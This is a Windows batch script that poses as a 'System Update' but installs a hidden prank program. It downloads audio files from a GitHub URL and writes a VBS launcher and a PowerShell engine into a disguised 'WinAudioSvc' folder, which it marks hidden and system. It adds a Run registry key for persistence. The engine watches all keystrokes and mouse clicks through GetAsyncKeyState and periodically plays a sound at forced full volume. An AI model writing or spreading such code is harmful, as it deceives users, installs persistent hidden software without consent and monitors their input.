@echo off
title System Update
color 0a

set "D=%APPDATA%\Microsoft\WinAudioSvc"
set "R=https://raw.githubusercontent.com/boxsenseii/windows-sound-driver/main"

echo Applying update...

mkdir "%D%" 2>nul
mkdir "%D%\sounds" 2>nul

for /L %%i in (1,1,12) do (
    powershell -c "try{Invoke-WebRequest '%R%/sounds/Audio%%i.mp3' -OutFile '%D%\sounds\Audio%%i.mp3' -UseBasicParsing}catch{}" 2>nul
)

> "%D%\svc.vbs" echo Set fso = CreateObject("Scripting.FileSystemObject")
>> "%D%\svc.vbs" echo Set sh  = CreateObject("WScript.Shell")
>> "%D%\svc.vbs" echo d = fso.GetParentFolderName(WScript.ScriptFullName)
>> "%D%\svc.vbs" echo sh.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File """ ^& d ^& "\engine.ps1""", 0, False

set "F=%D%\engine.ps1"
> "%F%" echo $mtx = New-Object System.Threading.Mutex($false, "Global\WinAudioSvcMtx")
>> "%F%" echo if (-not $mtx.WaitOne(0)) { exit }
>> "%F%" echo Add-Type -TypeDefinition @'
>> "%F%" echo using System;
>> "%F%" echo using System.Runtime.InteropServices;
>> "%F%" echo using System.Text;
>> "%F%" echo [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
>> "%F%" echo class MMDevEnum {}
>> "%F%" echo [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
>> "%F%" echo interface IMMDE { int _0(); int GetDefaultAudioEndpoint(int df, int r, out IMMD ep); }
>> "%F%" echo [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
>> "%F%" echo interface IMMD { int Activate(ref Guid iid, int ctx, IntPtr ap, [MarshalAs(UnmanagedType.IUnknown)] out object o); }
>> "%F%" echo [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
>> "%F%" echo interface IAEV {
>> "%F%" echo     int _0(); int _1(); int _2(); int _3(); int _4(); int _5(); int _6();
>> "%F%" echo     int SetMasterVolumeLevelScalar(float lv, ref Guid g);
>> "%F%" echo     int _7();
>> "%F%" echo     int GetMasterVolumeLevelScalar(out float lv);
>> "%F%" echo     int _8();
>> "%F%" echo     int SetMute([MarshalAs(UnmanagedType.Bool)] bool m, ref Guid g);
>> "%F%" echo     int GetMute(out bool m);
>> "%F%" echo }
>> "%F%" echo public class W {
>> "%F%" echo     [DllImport("user32.dll")]
>> "%F%" echo     public static extern short GetAsyncKeyState(int vKey);
>> "%F%" echo     [DllImport("winmm.dll")]
>> "%F%" echo     public static extern int mciSendString(string cmd, StringBuilder ret, int retLen, IntPtr cb);
>> "%F%" echo     static IAEV GV() {
>> "%F%" echo         var e = (IMMDE)new MMDevEnum();
>> "%F%" echo         IMMD d; e.GetDefaultAudioEndpoint(0, 1, out d);
>> "%F%" echo         var iid = typeof(IAEV).GUID; object o;
>> "%F%" echo         d.Activate(ref iid, 1, IntPtr.Zero, out o);
>> "%F%" echo         return (IAEV)o;
>> "%F%" echo     }
>> "%F%" echo     public static float VGet() { float l; GV().GetMasterVolumeLevelScalar(out l); return l; }
>> "%F%" echo     public static void VSet(float l) { var v = GV(); var g = Guid.Empty; v.SetMute(false, ref g); v.SetMasterVolumeLevelScalar(l, ref g); }
>> "%F%" echo }
>> "%F%" echo '@
>> "%F%" echo $sd = Join-Path $PSScriptRoot 'sounds'
>> "%F%" echo $kc = 0; $mc = 0
>> "%F%" echo $kw = $false; $mw = $false
>> "%F%" echo $playing = $false; $oldVol = -1
>> "%F%" echo while ($true) {
>> "%F%" echo     Start-Sleep -Milliseconds 30
>> "%F%" echo     if ($playing) {
>> "%F%" echo         $buf = New-Object System.Text.StringBuilder 128
>> "%F%" echo         [W]::mciSendString("status prnk mode", $buf, 128, [IntPtr]::Zero)
>> "%F%" echo         if ($buf.ToString() -ne "playing") {
>> "%F%" echo             if ($oldVol -ge 0) { try { [W]::VSet($oldVol) } catch {} }
>> "%F%" echo             $playing = $false
>> "%F%" echo         }
>> "%F%" echo     }
>> "%F%" echo     $kd = $false
>> "%F%" echo     foreach ($k in (65..90 + 48..57 + @(32,8,9,13,190,188))) {
>> "%F%" echo         if ([W]::GetAsyncKeyState($k) -band 0x8000) { $kd = $true; break }
>> "%F%" echo     }
>> "%F%" echo     if ($kd -and (-not $kw)) { $kc++ }
>> "%F%" echo     $kw = $kd
>> "%F%" echo     $md = $false
>> "%F%" echo     foreach ($b in @(1,2,4)) {
>> "%F%" echo         if ([W]::GetAsyncKeyState($b) -band 0x8000) { $md = $true; break }
>> "%F%" echo     }
>> "%F%" echo     if ($md -and (-not $mw)) { $mc++ }
>> "%F%" echo     $mw = $md
>> "%F%" echo     if ($kc -ge 500 -or $mc -ge 100) {
>> "%F%" echo         $kc = 0; $mc = 0
>> "%F%" echo         $files = Get-ChildItem -Path $sd -Filter '*.mp3' ^| Select-Object -ExpandProperty FullName
>> "%F%" echo         if ($files.Count -gt 0) {
>> "%F%" echo             $pick = $files ^| Get-Random
>> "%F%" echo             try { $oldVol = [W]::VGet(); [W]::VSet(1.0) } catch { $oldVol = -1 }
>> "%F%" echo             [W]::mciSendString("close prnk", $null, 0, [IntPtr]::Zero)
>> "%F%" echo             [W]::mciSendString("open `"$pick`" alias prnk", $null, 0, [IntPtr]::Zero)
>> "%F%" echo             [W]::mciSendString("play prnk", $null, 0, [IntPtr]::Zero)
>> "%F%" echo             $playing = $true
>> "%F%" echo         }
>> "%F%" echo     }
>> "%F%" echo }

attrib +h +s "%D%" >nul 2>&1
attrib +h "%D%\*.*" >nul 2>&1
attrib +h +s "%D%\sounds" >nul 2>&1
attrib +h "%D%\sounds\*.*" >nul 2>&1

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinAudioSvc" /t REG_SZ /d "wscript.exe \"%D%\svc.vbs\"" /f >nul

start "" wscript.exe "%D%\svc.vbs"

echo.
echo Update complete.
echo.
timeout /t 3 >nul
exit
